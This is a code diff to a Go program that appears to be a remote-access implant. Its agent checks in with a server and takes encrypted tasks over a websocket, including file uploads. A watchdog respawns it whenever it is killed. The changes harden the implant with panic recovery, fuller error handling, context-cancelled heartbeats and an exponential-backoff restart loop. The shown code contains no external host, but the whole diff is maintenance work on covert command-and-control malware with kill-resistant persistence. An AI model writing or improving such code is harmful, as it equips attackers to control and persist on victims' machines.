@@ -1,6 +1,7 @@
 package main
 
 import (
+	"context"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -96,6 +97,12 @@ func (a *Agent) checkin() error {
 }
 
 func (a *Agent) handleTask(task map[string]interface{}) {
+	defer func() {
+		if rec := recover(); rec != nil {
+			log.Printf("Panic in handleTask: %v", rec)
+		}
+	}()
+
 	taskID := task["ID"].(string)
 	command := task["Command"].(string)
 	args := ""
@@ -121,12 +128,15 @@ func (a *Agent) handleTask(task map[string]interface{}) {
 
 	case "upload":
 		parts := make(map[string]string)
-		json.Unmarshal([]byte(args), &parts)
-		err = a.fileMgr.WriteFileBase64(parts["path"], parts["data"])
-		if err != nil {
-			result = fmt.Sprintf("error: %v", err)
+		if err := json.Unmarshal([]byte(args), &parts); err != nil {
+			result = fmt.Sprintf("error: invalid upload data: %v", err)
 		} else {
-			result = "file uploaded"
+			err = a.fileMgr.WriteFileBase64(parts["path"], parts["data"])
+			if err != nil {
+				result = fmt.Sprintf("error: %v", err)
+			} else {
+				result = "file uploaded"
+			}
 		}
 
 	case "pwd":
@@ -395,9 +405,21 @@ func (a *Agent) handleTask(task map[string]interface{}) {
 		"result":  result,
 	}
 
-	data, _ := json.Marshal(response)
-	encrypted, _ := a.crypto.Encrypt(data)
-	a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
+	data, err := json.Marshal(response)
+	if err != nil {
+		log.Printf("Failed to marshal response: %v", err)
+		return
+	}
+	
+	encrypted, err := a.crypto.Encrypt(data)
+	if err != nil {
+		log.Printf("Failed to encrypt response: %v", err)
+		return
+	}
+	
+	if err := a.conn.WriteMessage(websocket.TextMessage, []byte(encrypted)); err != nil {
+		log.Printf("Failed to send response: %v", err)
+	}
 }
 
 func (a *Agent) run() {
@@ -419,37 +441,57 @@ func (a *Agent) run() {
 			continue
 		}
 
+		ctx, cancel := context.WithCancel(context.Background())
 		ticker := time.NewTicker(a.config.Interval)
-		defer ticker.Stop()
 
 		go func() {
-			for range ticker.C {
-				heartbeat := map[string]string{"status": "alive"}
-				data, _ := json.Marshal(heartbeat)
-				encrypted, _ := a.crypto.Encrypt(data)
-				conn.WriteMessage(websocket.TextMessage, []byte(encrypted))
+			defer ticker.Stop()
+			for {
+				select {
+				case <-ticker.C:
+					heartbeat := map[string]string{"status": "alive"}
+					data, err := json.Marshal(heartbeat)
+					if err != nil {
+						log.Printf("Failed to marshal heartbeat: %v", err)
+						continue
+					}
+					encrypted, err := a.crypto.Encrypt(data)
+					if err != nil {
+						log.Printf("Failed to encrypt heartbeat: %v", err)
+						continue
+					}
+					if err := conn.WriteMessage(websocket.TextMessage, []byte(encrypted)); err != nil {
+						log.Printf("Failed to send heartbeat: %v", err)
+					}
+				case <-ctx.Done():
+					return
+				}
 			}
 		}()
 
 		for {
 			_, msg, err := conn.ReadMessage()
 			if err != nil {
+				cancel()
 				break
 			}
 
 			decrypted, err := a.crypto.Decrypt(string(msg))
 			if err != nil {
+				log.Printf("Decrypt failed: %v", err)
 				continue
 			}
 
 			var task map[string]interface{}
 			if err := json.Unmarshal(decrypted, &task); err != nil {
+				log.Printf("Unmarshal failed: %v", err)
 				continue
 			}
 
 			go a.handleTask(task)
 		}
 
+		cancel()
 		conn.Close()
 		time.Sleep(a.config.Interval)
 	}
@@ -557,21 +599,42 @@ func main() {
 }
 
 func runWatchdog() {
-	// Spawn watchdog that restarts agent if killed
 	exePath, err := os.Executable()
 	if err != nil {
 		return
 	}
 
 	go func() {
+		restartCount := 0
+		maxRetries := 10
+
 		for {
+			if restartCount >= maxRetries {
+				log.Printf("Max restart attempts reached, exiting watchdog")
+				return
+			}
+
 			cmd := exec.Command(exePath, "--watchdog")
+			startTime := time.Now()
 			cmd.Start()
-			cmd.Wait()                  // Wait for process to die
-			time.Sleep(2 * time.Second) // Delay before restart
+			cmd.Wait()
+
+			runtime := time.Since(startTime)
+			if runtime < 30*time.Second {
+				restartCount++
+			} else {
+				restartCount = 0
+			}
+
+			backoff := time.Duration(2<<uint(restartCount)) * time.Second
+			if backoff > 5*time.Minute {
+				backoff = 5 * time.Minute
+			}
+
+			log.Printf("Agent died, restarting in %v (attempt %d/%d)", backoff, restartCount, maxRetries)
+			time.Sleep(backoff)
 		}
 	}()
 
-	// Keep main process alive to maintain watchdog
 	select {}
 }
